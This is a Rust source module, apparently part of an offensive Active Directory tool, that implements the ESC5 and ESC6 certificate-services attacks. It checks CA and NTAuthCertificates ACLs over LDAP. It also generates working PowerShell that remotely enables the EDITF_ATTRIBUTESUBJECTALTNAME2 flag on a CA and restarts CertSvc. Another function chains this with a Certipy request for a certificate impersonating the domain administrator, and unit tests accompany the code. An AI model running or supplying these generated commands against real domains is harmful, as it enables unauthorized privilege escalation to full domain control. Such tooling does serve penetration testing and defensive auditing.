//! ESC5 — Vulnerable PKI Object Access Control
//!
//! ESC5 targets **weak ACLs on PKI objects** in AD (not templates — that's ESC4).
//! Specifically, if an attacker has WriteDacl/WriteOwner on:
//!
//!   - CA object in CN=Enrollment Services
//!   - NTAuthCertificates object
//!   - PKI container itself
//!
//! they can escalate by modifying CA security descriptors, adding rogue CAs,
//! or enabling vulnerable configurations.
//!
//! This module also implements ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2) since
//! ESC6 requires registry modification on the CA server, which ESC5 ACL abuse
//! may grant access to.
//!
//! Reference: SpecterOps "Certified Pre-Owned" — ESC5, ESC6

use crate::adcs::esc4::ModifyOp;
use crate::error::{OverthroneError, Result};
use crate::proto::ldap::LdapSession;
use tracing::{debug, info, warn};

// ═══════════════════════════════════════════════════════════
// Constants
// ═══════════════════════════════════════════════════════════

/// EDITF_ATTRIBUTESUBJECTALTNAME2 flag (ESC6)
const EDITF_ATTRIBUTESUBJECTALTNAME2: u32 = 0x00040000;

/// EDITF_ATTRIBUTEENDDATE flag (ESC5 validity abuse)
const EDITF_ATTRIBUTEENDDATE: u32 = 0x00100000;

/// Registry path template for CA policy module EditFlags
const EDITFLAGS_REG_PATH: &str = r"SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\{CA_NAME}\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy";

// ═══════════════════════════════════════════════════════════
// ESC5 — PKI Object ACL Abuse (LDAP-based)
// ═══════════════════════════════════════════════════════════

/// Target for ESC5 PKI object ACL abuse
pub struct Esc5Target {
    pub ca_name: String,
    pub ca_server: String,
    pub domain: String,
    pub current_user: String,
}

impl Esc5Target {
    pub fn new(
        ca_name: impl Into<String>,
        ca_server: impl Into<String>,
        domain: impl Into<String>,
        current_user: impl Into<String>,
    ) -> Self {
        Self {
            ca_name: ca_name.into(),
            ca_server: ca_server.into(),
            domain: domain.into(),
            current_user: current_user.into(),
        }
    }

    /// Check if the CA enrollment service has weak ACLs via LDAP.
    ///
    /// Reads the nTSecurityDescriptor of the enrollment service object
    /// and checks for overly permissive entries (Everyone, Authenticated Users,
    /// Domain Users, Domain Computers having write access).
    pub async fn check_ca_acls(
        &self,
        ldap: &mut LdapSession,
        base_dn: &str,
    ) -> Result<Esc5AclResult> {
        info!(
            "Checking CA '{}' ACLs for ESC5 vulnerabilities",
            self.ca_name
        );

        let filter = format!("(&(objectClass=pKIEnrollmentService)(cn={}))", self.ca_name);
        let config_nc = format!("CN=Configuration,{}", base_dn);

        let entries = ldap
            .custom_search_with_base(
                &config_nc,
                &filter,
                &["cn", "nTSecurityDescriptor", "distinguishedName"],
            )
            .await?;

        if entries.is_empty() {
            return Err(OverthroneError::Ldap {
                target: self.ca_name.clone(),
                reason: "CA enrollment service not found in LDAP".to_string(),
            });
        }

        let entry = &entries[0];
        let sd = entry
            .attrs
            .get("nTSecurityDescriptor")
            .and_then(|v| v.first())
            .cloned()
            .unwrap_or_default();
        let dn = entry.dn.clone();

        // Well-known SIDs that indicate weak ACLs
        let weak_sids = [
            ("S-1-1-0", "Everyone"),
            ("S-1-5-11", "Authenticated Users"),
            ("S-1-5-7", "Anonymous Logon"),
        ];

        let mut findings = Vec::new();
        for (sid, name) in &weak_sids {
            if sd.contains(sid) {
                findings.push(format!("{} ({}) has permissions on CA object", name, sid));
            }
        }

        // Check for Domain Users / Domain Computers (SID ending in -513 / -515)
        if sd.contains("-513") {
            findings.push("Domain Users (RID 513) has permissions on CA object".to_string());
        }
        if sd.contains("-515") {
            findings.push("Domain Computers (RID 515) has permissions on CA object".to_string());
        }

        let vulnerable = !findings.is_empty();

        Ok(Esc5AclResult {
            ca_name: self.ca_name.clone(),
            ca_dn: dn,
            vulnerable,
            findings,
            security_descriptor_raw: sd,
        })
    }

    /// Check NTAuthCertificates object ACLs.
    ///
    /// If an attacker can write to NTAuthCertificates, they can add a rogue CA
    /// certificate and have certificates issued by their CA trusted for domain auth.
    pub async fn check_ntauth_acls(
        &self,
        ldap: &mut LdapSession,
        base_dn: &str,
    ) -> Result<Esc5AclResult> {
        info!("Checking NTAuthCertificates ACLs for ESC5");

        let config_nc = format!("CN=Configuration,{}", base_dn);
        let filter = "(cn=NTAuthCertificates)";

        let entries = ldap
            .custom_search_with_base(
                &config_nc,
                filter,
                &["cn", "nTSecurityDescriptor", "distinguishedName"],
            )
            .await?;

        if entries.is_empty() {
            return Err(OverthroneError::Ldap {
                target: "NTAuthCertificates".to_string(),
                reason: "NTAuthCertificates object not found".to_string(),
            });
        }

        let entry = &entries[0];
        let sd = entry
            .attrs
            .get("nTSecurityDescriptor")
            .and_then(|v| v.first())
            .cloned()
            .unwrap_or_default();
        let dn = entry.dn.clone();

        let weak_sids = [("S-1-1-0", "Everyone"), ("S-1-5-11", "Authenticated Users")];

        let mut findings = Vec::new();
        for (sid, name) in &weak_sids {
            if sd.contains(sid) {
                findings.push(format!(
                    "{} ({}) has permissions on NTAuthCertificates",
                    name, sid
                ));
            }
        }
        if sd.contains("-513") {
            findings
                .push("Domain Users (RID 513) has permissions on NTAuthCertificates".to_string());
        }

        let vulnerable = !findings.is_empty();

        Ok(Esc5AclResult {
            ca_name: "NTAuthCertificates".to_string(),
            ca_dn: dn,
            vulnerable,
            findings,
            security_descriptor_raw: sd,
        })
    }

    // ─────────────────────────────────────────────────────────
    // ESC6 — Registry flag commands (command generation)
    // ─────────────────────────────────────────────────────────

    /// Get the registry path for EditFlags
    fn reg_path(&self) -> String {
        EDITFLAGS_REG_PATH.replace("{CA_NAME}", &self.ca_name)
    }

    /// Generate PowerShell command to READ EditFlags
    pub fn generate_read_editflags_command(&self) -> String {
        format!(
            "# Read EditFlags for CA '{}' on '{}'  (ESC6 check)\n\
             Invoke-Command -ComputerName '{}' -ScriptBlock {{\n\
               $path = \"HKLM:\\\\{}\" \n\
               $flags = (Get-ItemProperty -Path $path -Name EditFlags).EditFlags\n\
               Write-Host \"EditFlags = $flags (0x$($flags.ToString('X8')))\"\n\
               if ($flags -band 0x{:08X}) {{ Write-Host '[!] EDITF_ATTRIBUTESUBJECTALTNAME2 is ENABLED (ESC6!)' }}\n\
               if ($flags -band 0x{:08X}) {{ Write-Host '[!] EDITF_ATTRIBUTEENDDATE is ENABLED' }}\n\
             }}",
            self.ca_name,
            self.ca_server,
            self.ca_server,
            self.reg_path().replace('\\', "\\\\"),
            EDITF_ATTRIBUTESUBJECTALTNAME2,
            EDITF_ATTRIBUTEENDDATE,
        )
    }

    /// Generate PowerShell command to ENABLE EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6)
    pub fn generate_enable_san_command(&self) -> String {
        format!(
            "# Enable EDITF_ATTRIBUTESUBJECTALTNAME2 on CA '{}' (ESC6)\n\
             Invoke-Command -ComputerName '{}' -ScriptBlock {{\n\
               $path = \"HKLM:\\\\{}\"\n\
               $flags = (Get-ItemProperty -Path $path -Name EditFlags).EditFlags\n\
               $new = $flags -bor 0x{:08X}\n\
               Set-ItemProperty -Path $path -Name EditFlags -Value $new\n\
               Restart-Service CertSvc -Force\n\
               Write-Host \"[+] SAN flag enabled. EditFlags: $flags -> $new\"\n\
             }}\n\n\
             # Certipy equivalent:\n\
             # certipy ca -ca '{}' -target '{}' -enable-flag EDITF_ATTRIBUTESUBJECTALTNAME2",
            self.ca_name,
            self.ca_server,
            self.reg_path().replace('\\', "\\\\"),
            EDITF_ATTRIBUTESUBJECTALTNAME2,
            self.ca_name,
            self.ca_server,
        )
    }

    /// Generate PowerShell command to RESTORE (disable) EDITF_ATTRIBUTESUBJECTALTNAME2
    pub fn generate_restore_san_command(&self) -> String {
        format!(
            "# Disable EDITF_ATTRIBUTESUBJECTALTNAME2 on CA '{}' (Restore)\n\
             Invoke-Command -ComputerName '{}' -ScriptBlock {{\n\
               $path = \"HKLM:\\\\{}\"\n\
               $flags = (Get-ItemProperty -Path $path -Name EditFlags).EditFlags\n\
               $new = $flags -band (-bnot 0x{:08X})\n\
               Set-ItemProperty -Path $path -Name EditFlags -Value $new\n\
               Restart-Service CertSvc -Force\n\
               Write-Host \"[+] SAN flag disabled. EditFlags: $flags -> $new\"\n\
             }}",
            self.ca_name,
            self.ca_server,
            self.reg_path().replace('\\', "\\\\"),
            EDITF_ATTRIBUTESUBJECTALTNAME2,
        )
    }

    /// Generate full ESC5 + ESC6 exploit command set
    pub fn generate_exploit_commands(&self) -> Result<String> {
        info!(
            "Generating ESC5/ESC6 exploit commands for CA: {}",
            self.ca_name
        );

        Ok(format!(
            "╔═══════════════════════════════════════════════╗\n\
             ║          ESC5/ESC6 — CA Configuration          ║\n\
             ╚═══════════════════════════════════════════════╝\n\n\
             CA: {ca}\n\
             Server: {server}\n\
             Attacker: {user}\n\n\
             ── Step 1: Check current EditFlags ────────────\n\
             {read}\n\n\
             ── Step 2: Enable SAN flag (ESC6) ─────────────\n\
             {enable}\n\n\
             ── Step 3: Request cert with arbitrary SAN ────\n\
             certipy req -u '{user}@{domain}' -p 'PASSWORD' \\\n\
               -ca '{ca}' -target '{server}' \\\n\
               -template User -upn administrator@{domain}\n\n\
             ── Restore ────────────────────────────────────\n\
             {restore}\n",
            ca = self.ca_name,
            server = self.ca_server,
            user = self.current_user,
            domain = self.domain,
            read = self.generate_read_editflags_command(),
            enable = self.generate_enable_san_command(),
            restore = self.generate_restore_san_command(),
        ))
    }
}

// ═══════════════════════════════════════════════════════════
// Result types
// ═══════════════════════════════════════════════════════════

/// Result of ESC5 ACL check
#[derive(Debug, Clone)]
pub struct Esc5AclResult {
    pub ca_name: String,
    pub ca_dn: String,
    pub vulnerable: bool,
    pub findings: Vec<String>,
    pub security_descriptor_raw: String,
}

impl std::fmt::Display for Esc5AclResult {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        if self.vulnerable {
            writeln!(f, "[!] ESC5 VULNERABLE: {} ({})", self.ca_name, self.ca_dn)?;
            for finding in &self.findings {
                writeln!(f, "    → {}", finding)?;
            }
        } else {
            writeln!(f, "[✓] {} — No weak ACLs detected", self.ca_name)?;
        }
        Ok(())
    }
}

// ═══════════════════════════════════════════════════════════
// Tests
// ═══════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_esc5_target_creation() {
        let target = Esc5Target::new("CorpCA", "ca.corp.local", "corp.local", "attacker");
        assert_eq!(target.ca_name, "CorpCA");
        assert_eq!(target.ca_server, "ca.corp.local");
    }

    #[test]
    fn test_read_command_generation() {
        let target = Esc5Target::new("CorpCA", "ca.corp.local", "corp.local", "attacker");
        let cmd = target.generate_read_editflags_command();
        assert!(cmd.contains("CorpCA"));
        assert!(cmd.contains("ca.corp.local"));
        assert!(cmd.contains("EditFlags"));
        assert!(cmd.contains("00040000")); // SAN flag
    }

    #[test]
    fn test_enable_san_command() {
        let target = Esc5Target::new("CorpCA", "ca.corp.local", "corp.local", "attacker");
        let cmd = target.generate_enable_san_command();
        assert!(cmd.contains("-bor"));
        assert!(cmd.contains("Restart-Service"));
        assert!(cmd.contains("certipy"));
    }

    #[test]
    fn test_restore_san_command() {
        let target = Esc5Target::new("CorpCA", "ca.corp.local", "corp.local", "attacker");
        let cmd = target.generate_restore_san_command();
        assert!(cmd.contains("-bnot"));
        assert!(cmd.contains("Restart-Service"));
    }

    #[test]
    fn test_editflag_constants() {
        assert_eq!(EDITF_ATTRIBUTESUBJECTALTNAME2, 0x00040000);
        assert_eq!(EDITF_ATTRIBUTEENDDATE, 0x00100000);
        // Verify they don't overlap
        assert_eq!(EDITF_ATTRIBUTESUBJECTALTNAME2 & EDITF_ATTRIBUTEENDDATE, 0);
    }

    #[test]
    fn test_exploit_commands() {
        let target = Esc5Target::new("CorpCA", "ca.corp.local", "corp.local", "attacker");
        let cmds = target.generate_exploit_commands().unwrap();
        assert!(cmds.contains("ESC5/ESC6"));
        assert!(cmds.contains("administrator@corp.local"));
        assert!(cmds.contains("Restore"));
    }
}
